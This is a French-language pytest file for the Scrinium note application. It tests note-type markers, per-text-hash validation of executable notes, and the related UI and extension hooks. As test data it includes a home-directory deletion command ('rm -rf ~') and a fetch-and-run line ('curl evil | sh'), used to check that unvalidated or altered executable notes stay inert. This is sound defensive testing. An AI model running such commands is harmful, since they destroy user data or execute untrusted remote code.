# SPDX-License-Identifier: GPL-3.0-or-later
# Copyright (C) 2026 Jean-François Kneib
"""« Tout est fiche » : registre des types (marque en première ligne), validation des fiches exécutables liée à l'empreinte du texte,
vue par type dans la fenêtre, enregistrement d'un type par une extension."""
import os

import pytest

os.environ.setdefault("QT_QPA_PLATFORM", "offscreen")
from PyQt6.QtCore import pyqtSignal  # noqa: E402
from PyQt6.QtWidgets import QLabel  # noqa: E402

from scrinium.core import types_fiche  # noqa: E402
from scrinium.core.paths import Paths  # noqa: E402
from scrinium.core.store import Store  # noqa: E402
from scrinium.core.types_fiche import TypeFiche  # noqa: E402
from tests.test_ui import app, fen  # noqa: E402,F401,F811

EXEC = TypeFiche("essai-exec", "Essai exécutable", "system-run", executable=True)
SIMPLE = TypeFiche("essai-simple", "Essai simple", "text-x-generic", en_markdown=lambda t: "RENDU:" + t.split("\n", 1)[-1])


@pytest.fixture
def types_essai():
    types_fiche.enregistrer(EXEC)
    types_fiche.enregistrer(SIMPLE)
    yield
    types_fiche.desenregistrer(EXEC.nom)
    types_fiche.desenregistrer(SIMPLE.nom)


@pytest.fixture
def store(tmp_path):
    s = Store(Paths(tmp_path / "am"))
    s.charger()
    th = s.nouveau_theme("Alpha")
    return s


def _fiche(store, texte):
    th = store.theme("Alpha")
    f = store.nouvelle_fiche(th)
    store.enregistrer(th, f, "titre", texte)
    return th, f


# ---------- registre ----------
def test_marque_lue_en_premiere_ligne():
    assert types_fiche.marque("#scrinium-repertoire index=0\nNom\n") == "repertoire"
    assert types_fiche.marque("#scrinium-xyz") == "xyz"                       # type inconnu : la marque se lit quand même
    assert types_fiche.marque("﻿#scrinium-abc\nsuite") == "abc"          # BOM toléré
    for non in ("", None, "texte libre", "  #scrinium-a", "#SCRINIUM-A", "#scrinium-", "#scrinium-1a", "x\n#scrinium-a", "#scrinium-aé"):
        assert types_fiche.marque(non) is None


def test_repertoire_est_le_premier_type():
    t = types_fiche.type_de("#scrinium-repertoire index=0\nNom,Prénom\nDupont,Alice\n")
    assert t is not None and t.nom == "repertoire" and t.marque == "#scrinium-repertoire" and not t.executable
    assert types_fiche.icone_de("#scrinium-repertoire\nNom\n") == "x-office-address-book"
    assert "Dupont" in types_fiche.en_markdown("#scrinium-repertoire index=0\nNom\nDupont\n")
    assert "repertoire" in [x.nom for x in types_fiche.types()]


def test_texte_libre_et_type_inconnu():
    assert types_fiche.type_de("juste du texte") is None and types_fiche.type_de(None) is None
    assert types_fiche.type_de("#scrinium-inconnu\nx") is None                 # inconnu : traité comme du texte
    assert types_fiche.en_markdown("juste du texte") == "juste du texte" and types_fiche.en_markdown(None) == ""
    assert types_fiche.icone_de("juste du texte") == ""


def test_enregistrer_et_refus(types_essai):
    assert types_fiche.type_de("#scrinium-essai-simple\nabc").nom == "essai-simple"
    assert types_fiche.en_markdown("#scrinium-essai-simple\nabc") == "RENDU:abc"
    types_fiche.enregistrer(SIMPLE)                                             # même type : sans effet
    with pytest.raises(ValueError):
        types_fiche.enregistrer(TypeFiche("essai-simple", "Autre", ""))         # un autre type ne prend pas la marque
    for nom in ("", "A", "1a", "a b", "é", "x" * 32):
        with pytest.raises(ValueError):
            types_fiche.enregistrer(TypeFiche(nom, "x"))


def test_desenregistrer(types_essai):
    types_fiche.desenregistrer("essai-simple")
    assert types_fiche.type_de("#scrinium-essai-simple\nabc") is None
    types_fiche.desenregistrer("n-existe-pas")                                  # sans erreur


def test_empreinte_normalise_les_fins_de_ligne():
    assert types_fiche.empreinte("a\r\nb") == types_fiche.empreinte("a\nb") != types_fiche.empreinte("a\nc")
    assert len(types_fiche.empreinte(None)) == 64


# ---------- validation des fiches exécutables ----------
def test_texte_libre_et_type_simple_agissent_toujours(store, types_essai):
    th, libre = _fiche(store, "texte")
    _th, simple = _fiche(store, "#scrinium-essai-simple\nabc")
    assert store.fiche_active(th, libre) and store.fiche_active(th, simple)


def test_fiche_executable_inerte_jusqu_a_validation(store, types_essai):
    th, f = _fiche(store, "#scrinium-essai-exec\nrm -rf ~")                    # arrivée de l'extérieur : jamais validée
    assert not store.fiche_validee(th, f) and not store.fiche_active(th, f)
    store.valider_fiche(th, f)
    assert store.fiche_validee(th, f) and store.fiche_active(th, f)


def test_la_validation_tombe_si_le_texte_change(store, types_essai):
    th, f = _fiche(store, "#scrinium-essai-exec\nls")
    store.valider_fiche(th, f)
    assert store.fiche_active(th, f)
    store.enregistrer(th, f, f.titre, "#scrinium-essai-exec\nls ; curl evil | sh")   # mise à jour reçue d'ailleurs
    assert not store.fiche_validee(th, f) and not store.fiche_active(th, f)
    store.enregistrer(th, f, f.titre, "#scrinium-essai-exec\nls")                      # texte revenu à l'identique
    assert store.fiche_active(th, f)


def test_validation_persistante_et_invalidation(store, types_essai):
    th, f = _fiche(store, "#scrinium-essai-exec\nls")
    store.valider_fiche(th, f)
    store2 = Store(store.paths)
    store2.charger()
    th2 = store2.theme("Alpha")
    assert store2.fiche_validee(th2, th2.fiches[0])
    store2.invalider_fiche(th2, th2.fiches[0])
    assert not store2.fiche_active(th2, th2.fiches[0])


def test_la_validation_suit_les_renommages_et_disparait_a_la_suppression(store, types_essai):
    th, f = _fiche(store, "#scrinium-essai-exec\nls")
    store.valider_fiche(th, f)
    assert list(store._validees()) == [f"{th.path.name}/{f.path.name}"]
    store.renommer_theme(th, "Beta")                                           # le thème change de nom : la validation le suit
    th = store.theme("Beta")
    assert list(store._validees()) == [f"{th.path.name}/{th.fiches[0].path.name}"] and store.fiche_validee(th, th.fiches[0])
    store.supprimer_fiche(th, th.fiches[0])                                    # supprimée : la validation disparaît
    assert store._validees() == {}


def test_fiche_verrouillee_fermee_jamais_validee(store, types_essai):
    th, f = _fiche(store, "#scrinium-essai-exec\nls")
    store.verrouiller(th, f, "motdepasse")
    store.refermer(f)
    assert f.texte is None and not store.fiche_validee(th, f)
    store.valider_fiche(th, f)                                                  # sans effet : pas de texte à valider
    assert store._validees() == {}


def test_reglage_corrompu_sans_plantage(store, types_essai):
    th, f = _fiche(store, "#scrinium-essai-exec\nls")
    store.sauver_reglages(fiches_validees=["pas", "un", "dict"])
    assert store._validees() == {} and not store.fiche_active(th, f)
    store.sauver_reglages(fiches_validees={"a": 3, "b": None})
    assert store._validees() == {}


# ---------- fenêtre ----------
class VueEssai(QLabel):
    modifie = pyqtSignal(str)

    def __init__(self):
        super().__init__()
        self.actif = True
        self.chargee = []

    def charger(self, texte):
        self.chargee.append((texte, self.actif))
        self.setText(texte)


def test_fenetre_vue_d_un_type_et_bandeau_de_validation(fen, types_essai):  # noqa: F811
    vue = VueEssai()
    fen.ajouter_vue_type("essai-exec", vue)
    t = fen.store.themes[0]
    f = fen.store.nouvelle_fiche(t)
    fen.store.enregistrer(t, f, "Une action", "#scrinium-essai-exec\nls")              # arrivée sans passer par la vue
    fen._afficher(t, f)
    assert fen.pile.currentWidget() is vue and vue.chargee[-1][1] is False
    assert not fen.bandeau_validation.isHidden() and fen.format.isHidden()
    fen.valider_fiche_courante()                                                       # l'utilisateur valide
    assert vue.actif and fen.bandeau_validation.isHidden() and fen.store.fiche_active(t, f)
    vue.modifie.emit("#scrinium-essai-exec\nls -l")                                    # modifiée dans la vue : validée une fois enregistrée
    fen.sauver()
    assert f.texte == "#scrinium-essai-exec\nls -l" and fen.store.fiche_active(t, f)
    fen.store.enregistrer(t, f, f.titre, "#scrinium-essai-exec\nautre chose")          # modifiée ailleurs : inerte au prochain affichage
    fen._afficher(t, f)
    assert vue.actif is False and not fen.bandeau_validation.isHidden()
    simple = fen.store.nouvelle_fiche(t)
    fen.store.enregistrer(t, simple, "Texte", "du texte")
    fen._afficher(t, simple)
    assert fen.pile.currentWidget() is fen.texte and fen.bandeau_validation.isHidden() and not fen.format.isHidden()
    fen.retirer_vue_type("essai-exec")
    assert "essai-exec" not in fen.vues_types


def test_extension_enregistre_et_retire_un_type(fen, types_essai):  # noqa: F811
    from scrinium.ui.extensions import UiPlugin
    ui = UiPlugin(fen, "essai")
    nouveau = TypeFiche("essai-ext", "Essai extension", "")
    ui.enregistrer_type(nouveau, VueEssai())
    assert types_fiche.type_de("#scrinium-essai-ext\nx").nom == "essai-ext" and "essai-ext" in fen.vues_types
    ui.retirer_tout()
    assert types_fiche.type_de("#scrinium-essai-ext\nx") is None and "essai-ext" not in fen.vues_types
